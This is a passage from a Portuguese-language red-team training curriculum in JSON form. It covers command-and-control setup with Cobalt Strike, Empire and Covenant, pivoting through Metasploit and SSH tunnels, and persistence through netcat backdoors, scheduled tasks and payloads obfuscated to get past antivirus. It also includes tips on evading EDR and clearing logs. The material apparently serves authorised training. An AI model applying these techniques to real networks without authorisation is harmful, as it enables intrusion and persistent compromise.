                              "practicalExample": "Em um jogo de guerra cibernético simulando um APT contra uma rede corporativa, identifique risco de IOC real (tráfego C2 detectado por SIEM), avalie consciência situacional baixa do blue team, mitigue com C2 obfuscado e plano B de abortar se detecção ocorrer em <5min.",
                              "finalVerifications": [
                                "Todos os riscos foram identificados e priorizados em matriz.",
                                "Consciência situacional mapeada com gaps explicitados.",
                                "IOCs analisados e mitigados com risco residual baixo.",
                                "Plano de contingência testável e aprovado.",
                                "Documentação completa e comunicada.",
                                "Revisão por pares realizada sem issues críticos."
                              ],
                              "assessmentCriteria": [
                                "Profundidade na identificação de riscos (cobertura >90%).",
                                "Precisão na avaliação de consciência situacional e IOCs.",
                                "Eficácia das mitigações (risco residual <20%).",
                                "Qualidade da documentação e clareza para stakeholders.",
                                "Integração com plano operacional geral.",
                                "Criatividade em conexões com mindset adversário."
                              ],
                              "crossCurricularConnections": [
                                "Gerenciamento de Projetos (PMBOK - Gestão de Riscos).",
                                "Análise de Dados (Quantificação probabilística de riscos).",
                                "Psicologia Organizacional (Consciência situacional humana).",
                                "Direito e Ética (Riscos legais em simulações).",
                                "Inteligência de Negócios (Previsão de impactos econômicos)."
                              ],
                              "realWorldApplication": "Durante planejamento de pentests reais para clientes, essa análise previne vazamentos de dados simulados que viram incidentes reais, reduzindo downtime e custos legais, como em operações de Red Team para bancos onde detecção prematura poderia expor fraquezas reais a atacantes externos."
                            },
                            "estimatedTime": "3 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.2.4.2.4",
                            "name": "Documentar plano de operação",
                            "description": "Elaborar um plano formal com fases, timelines, comandos e controles cibernéticos, integrando conceitos de pivoting e persistência.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Definir Objetivos e Escopo Operacional",
                                  "subSteps": [
                                    "Identifique os objetivos principais da operação cibernética, como simular um ataque APT.",
                                    "Delimite o escopo: alvos, regras de engajamento (ROE) e limitações técnicas/legais.",
                                    "Mapeie ameaças adversárias e cenários de pivoting inicial.",
                                    "Defina métricas de sucesso e critérios de abortar a operação.",
                                    "Documente premissas e riscos iniciais."
                                  ],
                                  "verification": "Verifique se objetivos são SMART (Specific, Measurable, Achievable, Relevant, Time-bound) e escopo está alinhado com ROE.",
                                  "estimatedTime": "2 horas",
                                  "materials": [
                                    "Template de plano de operação Red Team",
                                    "Documentação de ROE",
                                    "Ferramentas de mind mapping como XMind ou Draw.io"
                                  ],
                                  "tips": "Priorize objetivos alinhados ao mindset do adversário; use linguagem clara e concisa.",
                                  "learningObjective": "Compreender e articular objetivos operacionais claros para guiar toda a operação.",
                                  "commonMistakes": [
                                    "Definir escopo muito amplo levando a creep",
                                    "Ignorar restrições legais",
                                    "Não alinhar com capacidades da equipe"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Estruturar Fases e Timelines",
                                  "subSteps": [
                                    "Divida a operação em fases: Reconhecimento, Acesso Inicial, Pivoting, Persistência, Exfiltração e Relato.",
                                    "Atribua timelines realistas a cada fase, considerando dependências.",
                                    "Crie um Gantt chart ou cronograma visual para timelines.",
                                    "Inclua milestones e checkpoints de controle.",
                                    "Ajuste timelines com buffers para imprevistos cibernéticos."
                                  ],
                                  "verification": "Confirme que todas as fases cobrem o ciclo de ataque e timelines somam ao prazo total da operação.",
                                  "estimatedTime": "3 horas",
                                  "materials": [
                                    "Software de Gantt como Microsoft Project ou Trello",
                                    "Templates de fases MITRE ATT&CK",
                                    "Calendário compartilhado"
                                  ],
                                  "tips": "Use frameworks como Cyber Kill Chain para estruturar fases; teste timelines com simulações rápidas.",
                                  "learningObjective": "Dominar a divisão temporal de operações complexas para manter momentum.",
                                  "commonMistakes": [
                                    "Fases sobrepostas sem dependências claras",
                                    "Timelines irrealistas baseadas em cenários ideais",
                                    "Falta de buffers para detecção adversária"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Integrar Comandos, Controles e Técnicas Avançadas",
                                  "subSteps": [
                                    "Detalhe comandos C2 (Command and Control) com canais redundantes (ex: HTTPS, DNS).",
                                    "Incorpore pivoting: roteamento lateral via proxies SOCKS ou RDP.",
                                    "Planeje persistência: backdoors, scheduled tasks, registry modifications.",
                                    "Defina controles cibernéticos: kill switches, beacons de status e detecção de honeypots.",
                                    "Especifique ferramentas: Cobalt Strike para C2, Metasploit para pivoting."
                                  ],
                                  "verification": "Simule fluxos de pivoting e persistência em ambiente lab para validar comandos.",
                                  "estimatedTime": "4 horas",
                                  "materials": [
                                    "Labs virtuais (VirtualBox/VMware)",
                                    "Ferramentas C2 como Cobalt Strike trial",
                                    "Documentação MITRE ATT&CK para pivoting/persistência"
                                  ],
                                  "tips": "Priorize OPSEC em todos os comandos; teste persistência contra AV/EDR comuns.",
                                  "learningObjective": "Integrar técnicas de pivoting e persistência em um framework de controle operacional.",
                                  "commonMistakes": [
                                    "Canais C2 detectáveis",
                                    "Pivoting sem fallbacks",
                                    "Persistência frágil a reboots"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Compilar, Revisar e Formalizar o Documento",
                                  "subSteps": [
                                    "Compile todas as seções em um documento formal (Word/PDF/LaTeX).",
                                    "Inclua apêndices: diagramas de rede, playbooks de contingência.",
                                    "Realize revisão por pares: cheque completude, clareza e viabilidade.",
                                    "Adicione assinaturas de aprovação e versionamento.",
                                    "Exporte em formato seguro e distribua via canais criptografados."
                                  ],
                                  "verification": "Obtenha feedback de pelo menos 2 revisores confirmando ausência de gaps.",
                                  "estimatedTime": "2 horas",
                                  "materials": [
                                    "Editor de texto avançado (Overleaf para LaTeX)",
                                    "Ferramentas de revisão colaborativa (Google Docs)",
                                    "Checklists de plano Red Team"
                                  ],
                                  "tips": "Use numeração consistente e hyperlinks internos; mantenha confidencialidade com watermarking.",
                                  "learningObjective": "Produzir um artefato profissional pronto para execução operacional.",
                                  "commonMistakes": [
                                    "Falta de version control",
                                    "Seções incompletas ou ambíguas",
                                    "Distribuição insegura"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um jogo de guerra cibernético simulando um ataque a uma empresa de energia, o plano documenta: Fase 1 (Recon, 48h) com OSINT; Fase 2 (Acesso via phishing, pivoting via RDP); Persistência com golden ticket; C2 via Empire; Timeline total 7 dias com kill switch se detecção >30%.",
                              "finalVerifications": [
                                "Plano cobre todas as fases do ciclo de ataque com timelines viáveis.",
                                "Integração explícita de pivoting, persistência e C2 com redundâncias.",
                                "ROE e controles cibernéticos estão claramente definidos e priorizados.",
                                "Documentação é formal, versionada e aprovada por stakeholders.",
                                "Simulação rápida confirma executabilidade sem gaps.",
                                "Riscos e contingências são mapeados com probabilidades."
                              ],
                              "assessmentCriteria": [
                                "Completude: Todas as seções obrigatórias presentes e detalhadas (30%).",
                                "Clareza e Estrutura: Linguagem precisa, visualizações eficazes (25%).",
                                "Viabilidade Técnica: Técnicas de pivoting/persistência realistas e OPSEC-strong (20%).",
                                "Alinhamento Estratégico: Consistente com objetivos e mindset adversário (15%).",
                                "Revisão e Qualidade: Sem erros, feedback incorporado (10%)."
                              ],
                              "crossCurricularConnections": [
                                "Gerenciamento de Projetos: Uso de Gantt e Agile para timelines.",
                                "Estratégia Militar: Planejamento OODA Loop adaptado a ciber.",
                                "Análise de Riscos: Modelos como NIST para avaliação de ameaças.",
                                "Comunicações Técnicas: Redação profissional e diagramas.",
                                "Simulações e Jogos: Aplicação em wargames e CTFs."
                              ],
                              "realWorldApplication": "Em operações Red Team profissionais, como assessments para Fortune 500, esse plano guia simulações autorizadas de APTs, permitindo validação de defesas, treinamento de Blue Teams e conformidade regulatória (ex: NIST 800-53), reduzindo riscos reais de breaches."
                            },
                            "estimatedTime": "4 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          }
                        ]
                      },
                      {
                        "id": "10.1.2.4.3",
                        "name": "Execução e Controle Operacional",
                        "description": "Diretrizes para conduzir operações de forma controlada, mantendo comando e controle cibernético durante simulações ofensivas.",
                        "specificSkills": [
                          {
                            "id": "10.1.2.4.3.1",
                            "name": "Estabelecer comando e controle (C2)",
                            "description": "Implementar estruturas de C2 cibernético usando ferramentas como as descritas em SIMPSON et al., para coordenar ações do Red Team em tempo real.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Planejar a Arquitetura de Comando e Controle (C2)",
                                  "subSteps": [
                                    "Analisar requisitos operacionais do Red Team, incluindo número de agentes, latência aceitável e persistência necessária.",
                                    "Mapear infraestrutura C2, definindo servidores C2, listeners e canais de comunicação (ex: HTTP/HTTPS, DNS).",
                                    "Identificar defesas potenciais (firewalls, IDS/IPS) e planejar evasões baseadas em frameworks como SIMPSON et al.",
                                    "Definir papéis: operador C2, handlers de beacons e escalonamento de comandos.",
                                    "Documentar diagrama de rede C2 com fluxos de dados criptografados."
                                  ],
                                  "verification": "Revisar diagrama de arquitetura aprovado por equipe e simulação inicial em ambiente isolado.",
                                  "estimatedTime": "4-6 horas",
                                  "materials": "Ferramentas de diagramação (Draw.io), documentação SIMPSON et al., VMs para prototipagem.",
                                  "tips": "Priorize redundância com múltiplos C2 channels para alta disponibilidade.",
                                  "learningObjective": "Compreender componentes e trade-offs em arquiteturas C2 para cenários de Red Team.",
                                  "commonMistakes": "Ignorar detecção por tráfego anômalo; superestimar largura de banda sem testes."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Configurar e Implantar Ferramentas C2",
                                  "subSteps": [
                                    "Instalar ferramenta C2 (ex: Empire, Covenant ou similar conforme SIMPSON et al.) em servidor dedicado.",
                                    "Configurar listeners seguros com criptografia TLS e autenticação mútua.",
                                    "Gerar payloads para implantação em alvos simulados (stagers, beacons).",
                                    "Testar implantação inicial em ambiente lab com VMs Windows/Linux.",
                                    "Habilitar features como kill switches e self-destruct para segurança operacional."
                                  ],
                                  "verification": "Payloads implantados com beacons reportando ao C2 sem erros de log.",
                                  "estimatedTime": "6-8 horas",
                                  "materials": "Servidor VPS/VM para C2, payloads gerados, ferramentas como Git para repositórios open-source.",
                                  "tips": "Use domínios/apex para DNS C2, rotacionando para evitar bloqueios.",
                                  "learningObjective": "Dominar configuração prática de ferramentas C2 para coordenação em tempo real.",
                                  "commonMistakes": "Expor C2 diretamente à internet sem proxies/VPNs; payloads detectáveis por AV."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Testar e Validar Comunicação C2",
                                  "subSteps": [
                                    "Executar testes de conectividade end-to-end com beacons simulados.",
                                    "Simular comandos: coleta de dados, lateral movement e exfiltração.",
                                    "Medir latência, taxa de falha e detecção em ferramentas como Wireshark/Zeek.",
                                    "Realizar failover tests trocando channels C2 dinamicamente.",
                                    "Auditar logs para conformidade com OPSEC (Operational Security)."
                                  ],
                                  "verification": "100% de comandos executados com sucesso em 10 iterações; zero detecções em scanners simulados.",
                                  "estimatedTime": "4-6 horas",
                                  "materials": "Ambiente lab com múltiplas VMs, Wireshark, scripts de automação de testes.",
                                  "tips": "Registre métricas de performance para otimização iterativa.",
                                  "learningObjective": "Garantir robustez e stealth da infraestrutura C2 através de validação empírica.",
                                  "commonMistakes": "Testes insuficientes em redes com latência alta; ignorar jitter em beacons."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Integrar C2 com Operações do Red Team",
                                  "subSteps": [
                                    "Treinar equipe em interface C2 para issue de comandos em tempo real.",
                                    "Integrar com ferramentas de orquestração (ex: scripts Ansible para automação).",
                                    "Simular exercício completo: infiltração, C2 coordenação e extração.",
                                    "Estabelecer protocolos de handoff e debriefing pós-operação.",
                                    "Implementar monitoramento contínuo com alertas para anomalias."
                                  ],
                                  "verification": "Exercício simulado concluído com objetivos de missão atingidos via C2.",
                                  "estimatedTime": "5-7 horas",
                                  "materials": "Equipe Red Team, console C2, cenários de simulação (CTF-like).",
                                  "tips": "Use tasking queues para priorizar comandos em operações multi-agente.",
                                  "learningObjective": "Aplicar C2 em coordenação tática de Red Team para missões cibernéticas.",
                                  "commonMistakes": "Sobrecarga de operador único; falta de escalabilidade para >10 beacons."
                                }
                              ],
                              "practicalExample": "Em um laboratório de CTF, configure um servidor Covenant como C2. Implante beacons em VMs alvo via phishing simulado. Use o C2 para coordenar enumeração de rede, privilege escalation e exfiltração de flags, mantendo comunicação indetectável por Suricata.",
                              "finalVerifications": [
                                "Beacons estabelecem conexão persistente com <1% de falhas.",
                                "Comandos complexos (ex: shell interativo) executados em <5s.",
                                "Tráfego C2 evade detecção em ferramentas como Snort/Zeek.",
                                "Failover para channel secundário funciona sem perda de sessões.",
                                "Logs auditados confirmam OPSEC total.",
                                "Equipe demonstra proficiência em 80%+ de cenários simulados."
                              ],
                              "assessmentCriteria": [
                                "Precisão na configuração C2 (sem erros de sintaxe ou falhas de conexão): 25%.",
                                "Eficácia em evasão de detecção (taxa <5% em testes): 25%.",
                                "Velocidade e coordenação em simulações reais: 20%.",
                                "Documentação completa de arquitetura e lições aprendidas: 15%.",
                                "Integração com operações de equipe (feedback qualitativo): 15%."
                              ],
                              "crossCurricularConnections": [
                                "Redes e Comunicação: Protocolos TCP/UDP, tunelamento.",
                                "Criptografia: TLS, asymmetric keys para C2 seguro.",
                                "Liderança e Gerenciamento de Projetos: Coordenação de equipes distribuídas.",
                                "Análise de Dados: Monitoramento de logs e métricas de performance.",
                                "Ética em Cibersegurança: OPSEC e regras de engajamento."
                              ],
                              "realWorldApplication": "Em penetration tests autorizados (ex: contratos governamentais), C2 coordena equipes Red Team para simular APTs, identificando vulnerabilidades em infraestruturas críticas antes de exploits reais."
                            },
                            "estimatedTime": "4 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.2.4.3.2",
                            "name": "Executar táticas de pivoting e persistência",
                            "description": "Aplicar técnicas de ethical hacking para pivotar entre sistemas e estabelecer persistência simulada, monitorando indicadores de compromisso (IOCs).",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Preparar o ambiente e identificar alvos para pivoting",
                                  "subSteps": [
                                    "Configurar máquinas virtuais em um laboratório isolado (ex: Kali Linux como atacante, Metasploitable como vítima inicial).",
                                    "Realizar enumeração inicial na vítima comprometida para mapear hosts internos (usar nmap, netstat).",
                                    "Identificar serviços e portas acessíveis para pivoting (ex: RDP, SSH, SMB).",
                                    "Documentar rede interna e potenciais pontos de pivô.",
                                    "Verificar conectividade e privilégios atuais no host inicial."
                                  ],
                                  "verification": "Lista de hosts e serviços mapeados gerada e salva em relatório; ping ou nmap confirma acessibilidade.",
                                  "estimatedTime": "45 minutos",
                                  "materials": "Kali Linux VM, Metasploitable VMs, Nmap, VirtualBox/VMware.",
                                  "tips": "Use --reason no nmap para entender por que portas estão abertas.",
                                  "learningObjective": "Compreender a topologia de rede interna para planejar movimentos laterais.",
                                  "commonMistakes": "Ignorar firewalls internos; assumir privilégios root sem verificação."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Executar táticas de pivoting para acesso lateral",
                                  "subSteps": [
                                    "Configurar pivô usando SSH tunneling (ssh -D ou -L para dynamic/local forwarding).",
                                    "Utilizar Metasploit para route add e autoroute em sessões existentes.",
                                    "Explorar host pivô com exploits ou credenciais obtidas (ex: psexec para Windows).",
                                    "Estabelecer shell reverso do pivô para atacante.",
                                    "Testar conectividade para hosts adicionais via pivô."
                                  ],
                                  "verification": "Sessão shell ativa no host pivô; nmap através do túnel alcança hosts internos.",
                                  "estimatedTime": "60 minutos",
                                  "materials": "Metasploit Framework, SSH client, exploits compatíveis (ex: ms17-010).",
                                  "tips": "Prefira pivoting SOCKS proxy para flexibilidade em múltiplos alvos.",
                                  "learningObjective": "Dominar técnicas de tunelamento para navegação stealth em redes segmentadas.",
                                  "commonMistakes": "Expor túneis desnecessariamente; não limpar logs de conexão."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Estabelecer persistência simulada no host pivô",
                                  "subSteps": [
                                    "Criar backdoor com netcat ou Meterpreter persistence (run persistence).",
                                    "Adicionar tarefas agendadas (cron no Linux, schtasks no Windows).",
                                    "Modificar registry ou autostart entries para reboot survival.",
                                    "Criptografar payloads para evasão de AV (usar veil ou msfvenom).",
                                    "Testar persistência reiniciando o host."
                                  ],
                                  "verification": "Acesso reconectado após reboot; tarefa executando no scheduler.",
                                  "estimatedTime": "50 minutos",
                                  "materials": "Msfvenom, Netcat, PowerShell para Windows persistence.",
                                  "tips": "Use timers em tarefas para execução intermitente e menor detecção.",
                                  "learningObjective": "Implementar mecanismos de reentrada duráveis sem detecção imediata.",
                                  "commonMistakes": "Payloads não ofuscados detectados por AV; persistência sem teste de reboot."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Monitorar IOCs e validar a operação",
                                  "subSteps": [
                                    "Definir IOCs esperados (ex: novas conexões outbound, processos suspeitos).",
                                    "Usar ferramentas como Wireshark ou Procmon para monitorar tráfego e processos.",
                                    "Registrar logs de atividade no host pivô e atacante.",
                                    "Simular detecção e planejar exfiltração se IOCs acionados.",
                                    "Documentar cadeia de pivô e persistência para debrief."
                                  ],
                                  "verification": "Relatório de IOCs gerado; nenhum IOC falso positivo acionado indevidamente.",
                                  "estimatedTime": "40 minutos",
                                  "materials": "Wireshark, Sysmon, scripts de logging customizados.",
                                  "tips": "Correlacione IOCs com baselines normais do ambiente.",
                                  "learningObjective": "Identificar e mitigar indicadores de compromisso durante operações.",
                                  "commonMistakes": "Ignorar ruído de rede baseline; não documentar timestamps."
                                }
                              ],
                              "practicalExample": "Em um lab com três VMs (Kali atacante, Ubuntu vítima1, Windows vítima2), comprometa vítima1 via EternalBlue, pivote via SSH tunnel para vítima2, instale Meterpreter persistence via scheduled task, e monitore com Wireshark para tráfego C2 outbound.",
                              "finalVerifications": [
                                "Acesso shell estabelecido e mantido no host final via pivô.",
                                "Persistência sobrevive a reboot e reconecta automaticamente.",
                                "IOCs monitorados sem alertas falsos; stealth mantido.",
                                "Relatório completo com chain of custody de acessos.",
                                "Ambiente limpo: remoção de artifacts pós-teste.",
                                "Reproduzibilidade: operação repetível em setup similar."
                              ],
                              "assessmentCriteria": [
                                "Precisão na execução de pivoting (100% conectividade sem falhas).",
                                "Stealth da persistência (sem detecção por scans básicos AV/EDR).",
                                "Cobertura de IOCs (todos monitorados e logados adequadamente).",
                                "Eficiência temporal (dentro de tempo estimado total).",
                                "Documentação qualidade (diagramas de rede e passos claros).",
                                "Adaptação a cenários (manejo de falhas simuladas)."
                              ],
                              "crossCurricularConnections": [
                                "Redes: Compreensão profunda de roteamento e tunelamento (CCNA/Nmap).",
                                "Programação: Scripts Python/Bash para automação de persistence.",
                                "Análise Forense: Identificação de IOCs e chain of evidence.",
                                "Gestão de Projetos: Planejamento operacional red team.",
                                "Ética: Limites legais em simulações de hacking."
                              ],
                              "realWorldApplication": "Em engajamentos de Red Team/Pentest, permite simular atacantes APT movendo-se lateralmente em redes corporativas, persistindo para C2 duradouro, e evadindo detecção, ajudando organizações a fortalecer defesas contra ameaças persistentes."
                            },
                            "estimatedTime": "5 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.2.4.3.3",
                            "name": "Manter consciência situacional durante execução",
                            "description": "Monitorar o ambiente operacional em tempo real, ajustando táticas com base em respostas da Blue Team e mantendo alinhamento com ROE.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Configurar Ferramentas e Baselines de Monitoramento",
                                  "subSteps": [
                                    "Instalar e configurar ferramentas de monitoramento como Wireshark, Zeek, ou scripts personalizados para capturar tráfego de rede e logs do sistema.",
                                    "Estabelecer baselines do ambiente operacional atual, registrando tráfego normal, padrões de comportamento de hosts e métricas de desempenho.",
                                    "Definir alertas automatizados para anomalias potenciais, como picos de tráfego ou detecções de IDS/IPS.",
                                    "Integrar feeds de inteligência de ameaças em tempo real para contextualizar atividades observadas.",
                                    "Testar a configuração em um ambiente controlado para garantir captura precisa sem impacto no desempenho."
                                  ],
                                  "verification": "Verificar logs de configuração e realizar um teste de monitoramento simulando uma atividade benigna, confirmando que todos os dados são capturados corretamente.",
                                  "estimatedTime": "2-4 horas",
                                  "materials": "Ferramentas: Wireshark, Zeek, ELK Stack; Documentação de ROE; Ambiente de simulação (VMs ou lab cibernético).",
                                  "tips": "Priorize monitoramento passivo inicialmente para evitar detecção precoce pela Blue Team.",
                                  "learningObjective": "Compreender e implementar um sistema de monitoramento robusto que forneça visibilidade completa do ambiente sem comprometer a operação.",
                                  "commonMistakes": "Configurar alertas muito sensíveis que geram falsos positivos excessivos; ignorar baselines pré-operacionais."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Monitorar Continuamente o Ambiente Operacional",
                                  "subSteps": [
                                    "Executar varreduras cíclicas de rede e hosts para detectar mudanças em tempo real, usando ferramentas como Nmap ou custom scripts.",
                                    "Analisar logs em tempo real de proxies, firewalls e endpoints para identificar padrões emergentes.",
                                    "Rastrear movimentações de usuários e processos suspeitos que possam indicar respostas da Blue Team.",
                                    "Manter um dashboard unificado (ex: Kibana ou Splunk) para visualização rápida de métricas chave.",
                                    "Registrar timestamps precisos para todas as observações para reconstrução temporal posterior."
                                  ],
                                  "verification": "Dashboard mostra dados atualizados em tempo real e um relatório de monitoramento de 30 minutos sem lacunas.",
                                  "estimatedTime": "Contínuo, 1 hora inicial + monitoramento ongoing",
                                  "materials": "Dashboards: Kibana/Splunk; Scripts de automação; Acesso remoto seguro ao lab.",
                                  "tips": "Use rotação de IPs e proxies para mascarar sua atividade de monitoramento.",
                                  "learningObjective": "Desenvolver habilidades para vigilância persistente e detecção precoce de mudanças ambientais.",
                                  "commonMistakes": "Focar apenas em um tipo de log, perdendo visibilidade holística; sobrecarregar o sistema com monitoramento excessivo."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Analisar Respostas da Blue Team e Ajustar Táticas",
                                  "subSteps": [
                                    "Identificar indicadores de comprometimento (IoCs) como novos regras de firewall ou honeypots ativados.",
                                    "Mapear respostas observadas contra táticas conhecidas da Blue Team (ex: isolamento de rede, hunting de ameaças).",
                                    "Simular cenários de pivô ou escalada para testar hipóteses sobre ações da Blue Team.",
                                    "Ajustar vetores de ataque em tempo real, como mudar C2 channels ou payloads para evadir detecções.",
                                    "Consultar ROE antes de qualquer ajuste para garantir conformidade legal e operacional."
                                  ],
                                  "verification": "Documentar pelo menos uma detecção de resposta Blue Team e o ajuste tático correspondente, com evidências de logs.",
                                  "estimatedTime": "30-60 minutos por ciclo de análise",
                                  "materials": "Ferramentas de análise: IDA Pro, Volatility; Mapas táticos; ROE documentado.",
                                  "tips": "Mantenha um 'kill chain' mental flexível para pivôs rápidos.",
                                  "learningObjective": "Capacitar análise dinâmica de adversários e adaptação ágil de estratégias ofensivas.",
                                  "commonMistakes": "Reagir impulsivamente sem verificação, violando ROE; subestimar a velocidade de resposta da Blue Team."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Manter Alinhamento com ROE e Documentar Consciência Situacional",
                                  "subSteps": [
                                    "Revisar periodicamente todas as ações contra ROE para evitar violações.",
                                    "Gerar relatórios situacionais concisos com mapas de calor de atividades e recomendações.",
                                    "Compartilhar inteligência atualizada com a equipe Red Team via canais seguros.",
                                    "Preparar planos de contingência baseados em cenários observados.",
                                    "Arquivar todos os dados para debriefing pós-operação."
                                  ],
                                  "verification": "Relatório situacional aprovado pela liderança, confirmando alinhamento com ROE e cobertura completa de eventos.",
                                  "estimatedTime": "15-30 minutos por relatório",
                                  "materials": "Templates de relatório; Canais criptografados (Signal, C2 seguro); ROE checklist.",
                                  "tips": "Automatize relatórios com scripts para eficiência em operações longas.",
                                  "learningObjective": "Garantir operações éticas e documentadas, promovendo aprendizado contínuo.",
                                  "commonMistakes": "Ignorar ROE em momentos de alta pressão; documentação incompleta que impede lições aprendidas."
                                }
                              ],
                              "practicalExample": "Durante um exercício de Red Team em um lab corporativo simulado, ao injetar um payload via phishing, monitore logs do EDR e detecte uma quarentena automática pela Blue Team. Ajuste imediatamente para um vetor de exploração lateral via RDP, mantendo ROE ao evitar dados sensíveis reais.",
                              "finalVerifications": [
                                "Pode descrever com precisão mudanças no ambiente nos últimos 30 minutos?",
                                "Logs de monitoramento mostram cobertura contínua sem lacunas?",
                                "Todos os ajustes táticos foram validados contra ROE?",
                                "Relatório situacional inclui pelo menos 3 IoCs da Blue Team?",
                                "Dashboard reflete estado atual do ambiente em tempo real?",
                                "Equipe demonstra capacidade de pivô tático baseado em observações."
                              ],
                              "assessmentCriteria": [
                                "Precisão na detecção de respostas da Blue Team (90%+ taxa de acerto).",
                                "Velocidade de ajuste tático (resposta em <5 minutos a ameaças).",
                                "Conformidade total com ROE em todas as ações.",
                                "Qualidade e completude da documentação situacional.",
                                "Efetividade na manutenção de stealth (sem detecção auto-induzida).",
                                "Profundidade de análise em relatórios (inclui previsões e contingências)."
                              ],
                              "crossCurricularConnections": [
                                "Inteligência de Ameaças (SC-02): Uso de feeds para contextualizar observações.",
                                "Gestão de Incidentes (SC-08): Análise de respostas adversárias como em blue teaming.",
                                "Liderança e Comunicação (Soft Skills): Relatórios claros para equipes.",
                                "Análise de Malware (SC-04): Identificação de IoCs em payloads detectados."
                              ],
                              "realWorldApplication": "Em penetrações éticas autorizadas (pentests) ou operações de threat hunting, mantém o Red Team um passo à frente da defesa corporativa, minimizando detecções e maximizando cobertura de objetivos sem violações legais."
                            },
                            "estimatedTime": "3 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          }
                        ]
                      }
                    ]
                  }
                ]
              },
              {
                "id": "10.1.3",
                "name": "Consciência Situacional e Regras de Engajamento",
                "description": "Aborda a manutenção da percepção do ambiente cibernético e as diretrizes éticas e operacionais para ações de ataque.",
                "totalSkills": 48,
                "atomicTopics": [
                  {
                    "id": "10.1.3.1",
                    "name": "Conceito de Consciência Situacional Cibernética",
                    "description": "Definição e importância da percepção contínua do ambiente cibernético em operações de ataque.",
                    "individualConcepts": [
                      {
                        "id": "2.0.2.3.1.1",
                        "name": "Definição de Consciência Situacional Cibernética",
                        "description": "Compreensão da definição formal da consciência situacional cibernética como a percepção contínua, compreensão e antecipação do ambiente cibernético durante operações de ataque.",
                        "specificSkills": [
                          {
                            "id": "2.0.2.3.1.1.1",
                            "name": "Definir Consciência Situacional Cibernética",
                            "description": "Explicar a definição precisa da consciência situacional cibernética, incluindo sua aplicação em contextos de Red Team e operações ofensivas cibernéticas.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender o Modelo Clássico de Consciência Situacional",
                                  "subSteps": [
                                    "Estude o modelo de Mica Endsley, identificando os três níveis: Percepção (nível 1), Compreensão (nível 2) e Projeção (nível 3).",
                                    "Analise os fatores que influenciam a SA, como estresse, workload e automação.",
                                    "Revise exemplos de SA em domínios não cibernéticos, como aviação e controle de tráfego aéreo.",
                                    "Crie um diagrama resumindo os níveis e suas interdependências.",
                                    "Discuta como falhas em um nível afetam os subsequentes."
                                  ],
                                  "verification": "Desenhe e explique um diagrama dos 3 níveis da SA de Endsley, incluindo pelo menos um exemplo por nível.",
                                  "estimatedTime": "1.5 horas",
                                  "materials": [
                                    "Artigo 'Design and Evaluation for Situation Awareness Enhancement' de Mica Endsley (PDF)",
                                    "Vídeo introdutório sobre SA no YouTube (10-15 min)",
                                    "Papel e caneta para diagrama"
                                  ],
                                  "tips": "Use analogias cotidianas, como dirigir um carro, para fixar os níveis.",
                                  "learningObjective": "Dominar a teoria fundamental da consciência situacional como base para adaptações cibernéticas.",
                                  "commonMistakes": [
                                    "Confundir compreensão com projeção",
                                    "Ignorar influenciadores como fadiga mental",
                                    "Subestimar a interdependência dos níveis"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Definir Consciência Situacional no Contexto Cibernético",
                                  "subSteps": [
                                    "Pesquise definições padrão de Cyber Situational Awareness (CSA), como 'percepção do estado atual e dinâmico do ambiente cibernético'.",
                                    "Mapeie os 3 níveis de Endsley para elementos cibernéticos: tráfego de rede (percepção), ameaças ativas (compreensão), ataques futuros (projeção).",
                                    "Identifique métricas cibernéticas chave: logs SIEM, IOCs, anomalias em endpoints.",
                                    "Compare CSA com SA tradicional, destacando volatilidade e escala do ciberespaço.",
                                    "Escreva uma definição draft de CSA em 100 palavras."
                                  ],
                                  "verification": "Forneça uma definição escrita de CSA que incorpore os 3 níveis adaptados ao ciberespaço.",
                                  "estimatedTime": "2 horas",
                                  "materials": [
                                    "NIST SP 800-137 'Information Security Continuous Monitoring'",
                                    "Documentação de ferramentas como Splunk ou ELK Stack",
                                    "Notebook para rascunhos"
                                  ],
                                  "tips": "Foque em dados em tempo real; o ciberespaço muda segundos.",
                                  "learningObjective": "Adaptar o modelo clássico para criar uma definição precisa de CSA.",
                                  "commonMistakes": [
                                    "Generalizar demais sem elementos cibernéticos específicos",
                                    "Omitir a natureza dinâmica do ambiente cyber",
                                    "Confundir CSA com monitoramento passivo"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Explorar Aplicações em Red Team e Operações Ofensivas",
                                  "subSteps": [
                                    "Analise cenários Red Team: percepção de defesas (honeypots), compreensão de respostas (EDR alerts), projeção de contra-ataques.",
                                    "Estude regras de engajamento (ROE) em operações cibernéticas ofensivas, onde CSA previne escaladas indesejadas.",
                                    "Revise cases reais, como exercícios de Purple Team ou simulações MITRE ATT&CK.",
                                    "Simule um cenário: liste elementos de SA durante uma simulação de phishing em Red Team.",
                                    "Discuta como CSA ofensiva difere da defensiva (proativa vs. reativa)."
                                  ],
                                  "verification": "Descreva um cenário Red Team completo com os 3 níveis de CSA aplicados.",
